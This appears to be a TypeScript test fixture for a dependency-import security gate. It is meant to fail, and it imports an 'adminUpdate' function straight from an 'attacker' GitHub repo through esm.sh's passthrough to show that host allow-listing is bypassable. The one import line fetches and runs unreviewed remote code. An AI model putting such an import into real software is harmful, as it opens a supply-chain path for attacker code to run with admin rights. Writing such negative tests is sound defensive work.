// MUST-FAIL (M2 BLOCKING, post-P3a re-gate): a direct https:// specifier
// on an otherwise allow-listed host (esm.sh), using its "gh/" GitHub
// passthrough to fetch an unreviewed repo directly -- the OLD host
// allow-list trusted esm.sh outright and let this straight through. M2
// drops host trust entirely: every direct URL specifier is banned,
// regardless of host.
import { adminUpdate } from "https://esm.sh/gh/attacker/admin-lib@main/mod.ts";

export async function voidPlay(playId: string) {
  return adminUpdate(playId);
}
